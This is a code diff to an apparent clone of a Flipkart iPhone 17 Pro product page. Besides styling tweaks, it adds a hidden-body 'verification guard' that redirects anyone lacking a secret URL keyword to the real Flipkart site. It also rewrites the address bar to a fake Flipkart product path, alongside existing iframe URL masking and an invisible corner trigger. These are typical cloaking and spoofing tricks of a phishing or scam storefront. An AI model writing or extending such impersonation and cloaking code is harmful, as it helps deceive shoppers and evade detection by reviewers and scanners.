@@ -4,6 +4,34 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Apple iPhone 17 Pro - Flipkart</title>
+
+<!-- Anti-Flicker / Anti-Flash Verification Guard -->
+<style id="antiFlashStyle">
+  body { display: none !important; }
+</style>
+<script>
+  (function() {
+    const PRODUCT_URL_PATH = '/kk/apple-iphone-17-pro-deep-blue-256-gb/p/itm76fe37ca9ea8c';
+    const VERIFY_KEYWORD = 'apple-iphone-17-pro-deep-blue-256';
+    const fullHref = window.location.href;
+    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:';
+
+    if (fullHref.includes(VERIFY_KEYWORD) || isLocal) {
+      try {
+        window.history.replaceState({ product: true }, '', PRODUCT_URL_PATH);
+      } catch(e) {}
+      // Reveal page immediately when DOM is parsed
+      document.addEventListener('DOMContentLoaded', function() {
+        const style = document.getElementById('antiFlashStyle');
+        if (style) style.remove();
+      });
+    } else {
+      // Immediate redirect without rendering content
+      window.location.replace('https://www.flipkart.com');
+    }
+  })();
+</script>
+
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
 
@@ -90,7 +118,7 @@
   }
   .header-icon-btn:active { background: #f1f5f9; }
 
-  /* Product Carousel */
+  /* Product Carousel (Strict 1-by-1 slide snapping) */
   .carousel-wrapper {
     position: relative;
     width: 100%;
@@ -109,7 +137,8 @@
     flex: 0 0 100%;
     width: 100%;
     height: 420px;
-    scroll-snap-align: start;
+    scroll-snap-align: center;
+    scroll-snap-stop: always; /* Prevents skipping multiple images */
     display: flex;
     align-items: center;
     justify-content: center;
@@ -141,8 +170,8 @@
   }
   .play-circle-btn {
     position: absolute;
-    width: 60px;
-    height: 60px;
+    width: 58px;
+    height: 58px;
     background: #ff0000;
     border-radius: 50%;
     display: flex;
@@ -155,7 +184,7 @@
   .play-circle-btn svg { margin-left: 3px; }
   .video-slide-container:active .play-circle-btn { transform: scale(0.92); }
 
-  /* Bottom-Left Rating Badge on Image */
+  /* Rating Badge on bottom-left of image */
   .image-rating-badge {
     position: absolute;
     bottom: 14px;
@@ -186,9 +215,30 @@
     gap: 2px;
   }
 
+  /* Carousel Dots */
+  .carousel-dots-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 5px;
+    padding: 10px 0 6px;
+    background: #ffffff;
+  }
+  .carousel-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 3px;
+    background: #cbd5e1;
+    transition: all 0.25s ease;
+  }
+  .carousel-dot.active {
+    width: 18px;
+    background: var(--fk-blue);
+  }
+
   /* Product Details */
   .product-content {
-    padding: 14px 16px;
+    padding: 12px 16px 14px;
     background: #ffffff;
   }
   .product-title {
@@ -426,7 +476,7 @@
     font-weight: 600;
   }
 
-  /* 3 Ads Carousel Section */
+  /* 3 Ads Carousel Section with Morphing Progress Bar */
   .ads-section {
     padding: 14px 16px;
     background: #ffffff;
@@ -448,7 +498,8 @@
   .ad-slide {
     flex: 0 0 100%;
     width: 100%;
-    scroll-snap-align: start;
+    scroll-snap-align: center;
+    scroll-snap-stop: always;
     cursor: pointer;
   }
   .ad-slide img {
@@ -457,19 +508,26 @@
     display: block;
     border-radius: 8px;
   }
+  
+  /* Morphing Ad Progress Bar: Active is "----", Inactive are "-" */
   .ad-progress-bar-container {
     display: flex;
     gap: 6px;
     justify-content: center;
+    align-items: center;
     margin-top: 10px;
   }
-  .ad-progress-bar {
-    width: 32px;
-    height: 3px;
+  .ad-progress-item {
+    height: 4px;
     background: #e2e8f0;
     border-radius: 2px;
     overflow: hidden;
     position: relative;
+    width: 8px;
+    transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  .ad-progress-item.active {
+    width: 32px; /* Expanded active bar */
   }
   .ad-progress-fill {
     width: 0%;
@@ -515,14 +573,14 @@
     color: #ffffff;
   }
 
-  /* Video Popup Modal */
+  /* High Visibility Floating Close Button for Video Popup */
   .video-modal-backdrop {
     position: fixed;
     inset: 0;
-    background: rgba(255, 255, 255, 0.75);
-    backdrop-filter: blur(12px);
-    -webkit-backdrop-filter: blur(12px);
-    z-index: 2000;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    z-index: 2500;
     display: none;
     align-items: center;
     justify-content: center;
@@ -530,38 +588,36 @@
   }
   .video-modal-box {
     width: 100%;
-    max-width: 450px;
+    max-width: 460px;
     background: #000000;
     border-radius: 12px;
-    overflow: hidden;
     position: relative;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+    box-shadow: 0 12px 36px rgba(0,0,0,0.5);
   }
-  .video-modal-header {
-    display: flex;
-    justify-content: flex-end;
-    padding: 8px 12px;
-    background: #111827;
-  }
-  .video-close-btn {
-    background: rgba(255, 255, 255, 0.2);
-    color: #ffffff;
+  .video-close-floating-btn {
+    position: absolute;
+    top: -46px;
+    right: 0;
+    width: 36px;
+    height: 36px;
+    background: #ffffff;
+    color: #000000;
     border: none;
     border-radius: 50%;
-    width: 28px;
-    height: 28px;
-    font-size: 16px;
-    font-weight: bold;
+    font-size: 18px;
+    font-weight: 800;
     cursor: pointer;
     display: flex;
     align-items: center;
     justify-content: center;
-    transition: background 0.15s ease;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+    z-index: 2600;
   }
-  .video-close-btn:active { background: rgba(255, 255, 255, 0.4); }
   .video-iframe-wrapper {
     width: 100%;
     aspect-ratio: 16 / 9;
+    border-radius: 12px;
+    overflow: hidden;
   }
   .video-iframe-wrapper iframe {
     width: 100%;
@@ -672,7 +728,7 @@
     border: none;
   }
 
-  /* Invisible Trigger in Top-Left Corner to Return to product path */
+  /* Invisible Trigger in Top-Left Corner */
   #invisibleRefreshTrigger {
     position: fixed;
     top: 0;
@@ -695,7 +751,7 @@
       <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fk-mp-c815b6.svg" alt="Flipkart">
     </a>
     <div class="header-actions">
-      <!-- Search (opens in browser on SAME TAB, OUTSIDE iframe) -->
+      <!-- Search (opens directly in browser on SAME TAB, OUTSIDE iframe) -->
       <a href="https://www.flipkart.com/searchsuggestion" target="_self" class="header-icon-btn" title="Search">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="11" cy="11" r="8"></circle>
@@ -703,7 +759,7 @@
         </svg>
       </a>
 
-      <!-- Cart (opens outside iframe directly) -->
+      <!-- Cart (opens directly outside iframe) -->
       <a href="https://www.flipkart.com/viewcart" target="_self" class="header-icon-btn" title="Cart">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="9" cy="21" r="1"></circle>
@@ -714,15 +770,15 @@
     </div>
   </header>
 
-  <!-- Product Image Carousel -->
+  <!-- Product Image Carousel (1-by-1 snapping) -->
   <div class="carousel-wrapper">
-    <div class="carousel-track">
+    <div class="carousel-track" id="productCarouselTrack">
       <!-- 1. Main Image -->
       <div class="carousel-slide">
         <img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/5/i/n/-original-imahft5ndwfkx6ez.jpeg?q=90" alt="iPhone 17 Pro">
       </div>
 
-      <!-- 2. Video Slide with YouTube's Official Video Thumbnail and Closeable Popup -->
+      <!-- 2. Video Slide with YouTube's Video Thumbnail and Closeable Popup -->
       <div class="carousel-slide">
         <div class="video-slide-container" onclick="openVideoModal('https://www.youtube-nocookie.com/embed/FAbwR58dNHo?autoplay=1&playsinline=1&modestbranding=1&rel=0')">
           <img src="https://i.ytimg.com/vi/FAbwR58dNHo/hqdefault.jpg" onerror="this.src='https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/q/s/s/-original-imahft5nxa9wukz8.jpeg?q=90'" alt="YouTube Video Thumbnail">
@@ -747,12 +803,28 @@
       <div class="carousel-slide"><img src="https://rukminim2.flixcart.com/image/980/980/xif0q/mobile/l/z/q/-original-imahft57f3qjg325.jpeg?q=90" alt="Slide 12"></div>
     </div>
 
-    <!-- Rating badge positioned in LEFT CORNER of image (opens scroll-up sheet) -->
+    <!-- Rating badge positioned in LEFT CORNER of image -->
     <div class="image-rating-badge" onclick="openReviewsSheet()" title="View Reviews">
       <span class="star-pill">4.7 ★</span>
       <span>|</span>
       <span>44.8k+</span>
     </div>
+  </div>
+
+  <!-- Carousel Dots Indicators -->
+  <div class="carousel-dots-container" id="productCarouselDots">
+    <div class="carousel-dot active"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
   </div>
 
   <!-- Primary Product Info -->
@@ -1025,7 +1097,7 @@
 
   <div class="section-divider"></div>
 
-  <!-- 3 Ads Carousel under Tab Content (1.5s Auto Rotation & Dynamic Progress Bar) -->
+  <!-- 3 Ads Carousel with Morphing Progress Bar -->
   <div class="ads-section">
     <div class="ads-carousel-wrapper">
       <div class="ads-track" id="adsTrack">
@@ -1044,11 +1116,11 @@
       </div>
     </div>
 
-    <!-- Progress indicator bars -->
+    <!-- Progress indicator bars: Active is elongated ("----"), inactives are dots ("-") -->
     <div class="ad-progress-bar-container">
-      <div class="ad-progress-bar"><div class="ad-progress-fill" id="adFill0"></div></div>
-      <div class="ad-progress-bar"><div class="ad-progress-fill" id="adFill1"></div></div>
-      <div class="ad-progress-bar"><div class="ad-progress-fill" id="adFill2"></div></div>
+      <div class="ad-progress-item active" id="adBar0"><div class="ad-progress-fill" id="adFill0"></div></div>
+      <div class="ad-progress-item" id="adBar1"><div class="ad-progress-fill" id="adFill1"></div></div>
+      <div class="ad-progress-item" id="adBar2"><div class="ad-progress-fill" id="adFill2"></div></div>
     </div>
   </div>
 
@@ -1063,12 +1135,10 @@
   </div>
 </div>
 
-<!-- Video Popup Modal with Close Button inside Header -->
+<!-- Video Popup Modal with High Visibility Floating Close Button -->
 <div class="video-modal-backdrop" id="videoModal" onclick="closeVideoModal(event)">
   <div class="video-modal-box" onclick="event.stopPropagation()">
-    <div class="video-modal-header">
-      <button class="video-close-btn" onclick="closeVideoModal()" title="Close Video">✕</button>
-    </div>
+    <button class="video-close-floating-btn" onclick="closeVideoModal()" title="Close Video">✕</button>
     <div class="video-iframe-wrapper">
       <iframe id="videoModalFrame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
@@ -1124,34 +1194,23 @@
   <iframe id="appFrame" src="about:blank"></iframe>
 </div>
 
-<!-- Invisible Trigger in Top-Left Corner to Return to Custom Product URL inside index.html -->
+<!-- Invisible Trigger in Top-Left Corner to Return to Custom Product URL -->
 <div id="invisibleRefreshTrigger" onclick="handleInvisibleTrigger()" title="Back to Product"></div>
 
 <script>
-  // Normalized Target Product URL Path
-  const PRODUCT_URL_PATH = '/apple-iphone-17-pro-deep-blue-256-gb/p/itm76fe37ca9ea8c';
-  const VERIFY_KEYWORD = 'apple-iphone-17-pro-deep-blue-256';
+  const PRODUCT_URL_PATH = '/kk/apple-iphone-17-pro-deep-blue-256-gb/p/itm76fe37ca9ea8c';
 
-  // URL Verification and Routing Logic inside index.html
-  (function verifyAndInitializeRoute() {
-    const fullHref = window.location.href;
-    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:';
+  // Product Carousel Dots Sync Engine
+  const productTrack = document.getElementById('productCarouselTrack');
+  const productDots = document.querySelectorAll('#productCarouselDots .carousel-dot');
 
-    // Verify if the link contains the required product slug
-    if (fullHref.includes(VERIFY_KEYWORD)) {
-      try {
-        // Accept and cleanly normalize address bar to the custom product link
-        window.history.replaceState({ product: true }, '', PRODUCT_URL_PATH);
-      } catch(e) {}
-    } else if (!isLocal) {
-      // If someone visits direct domain or wrong link on production without the key, redirect to flipkart.com
-      window.location.replace('https://www.flipkart.com');
-    } else {
-      try {
-        window.history.replaceState({ product: true }, '', PRODUCT_URL_PATH);
-      } catch(e) {}
-    }
-  })();
+  productTrack.addEventListener('scroll', () => {
+    const slideWidth = productTrack.clientWidth;
+    const activeIndex = Math.round(productTrack.scrollLeft / slideWidth);
+    productDots.forEach((dot, idx) => {
+      dot.classList.toggle('active', idx === activeIndex);
+    });
+  }, { passive: true });
 
   // Product Tabs Switcher
   function switchProductTab(tabId, btn) {
@@ -1174,7 +1233,7 @@
     }
   }
 
-  // Video Popup Logic with instant pause on close
+  // Video Popup Logic (With Visible Close Button)
   function openVideoModal(videoUrl) {
     const modal = document.getElementById('videoModal');
     const iframe = document.getElementById('videoModalFrame');
@@ -1182,10 +1241,11 @@
     modal.style.display = 'flex';
   }
 
-  function closeVideoModal() {
+  function closeVideoModal(e) {
+    if (e && e.target && e.target.id !== 'videoModal' && !e.target.classList.contains('video-close-floating-btn')) return;
     const modal = document.getElementById('videoModal');
     const iframe = document.getElementById('videoModalFrame');
-    iframe.src = ''; // Stops playback instantly
+    iframe.src = ''; // Instantly stops YouTube playback
     modal.style.display = 'none';
   }
 
@@ -1196,13 +1256,14 @@
     setTimeout(() => { sheet.classList.add('active'); }, 10);
   }
 
-  function closeReviewsSheet() {
+  function closeReviewsSheet(e) {
+    if (e && e.target && e.target.id !== 'reviewsSheet' && e.target.tagName !== 'BUTTON') return;
     const sheet = document.getElementById('reviewsSheet');
     sheet.classList.remove('active');
     setTimeout(() => { sheet.style.display = 'none'; }, 300);
   }
 
-  // Full-Page Iframe Handler with Custom URL Mask: flipkart.com-[pagename]-[random]
+  // Full-Page Iframe Handler with Custom URL Mask
   function openInIframe(e, url, pageName = 'page') {
     if (e && e.preventDefault) e.preventDefault();
     closeReviewsSheet();
@@ -1221,9 +1282,7 @@
 
     try {
       window.history.pushState({ inIframe: true }, '', maskedUrl);
-    } catch(err) {
-      console.log(err);
-    }
+    } catch(err) {}
   }
 
   // Invisible Trigger Action: Closes iframe and cleanly restores custom product URL inside index.html
@@ -1249,7 +1308,7 @@
     }
   });
 
-  // 1.5s Animated Ads Carousel Engine
+  // 1.5s Morphing Progress Bar Ads Carousel Engine
   const adsTrack = document.getElementById('adsTrack');
   const totalAds = 3;
   let currentAd = 0;
@@ -1258,7 +1317,12 @@
 
   function updateAdProgress() {
     for (let i = 0; i < totalAds; i++) {
+      const bar = document.getElementById(`adBar${i}`);
       const fill = document.getElementById(`adFill${i}`);
+      
+      // Update Morphing pattern: Active is "----" (expanded), Inactive are "-" (dots)
+      bar.classList.toggle('active', i === currentAd);
+
       if (i < currentAd) {
         fill.style.transition = 'none';
         fill.style.width = '100%';
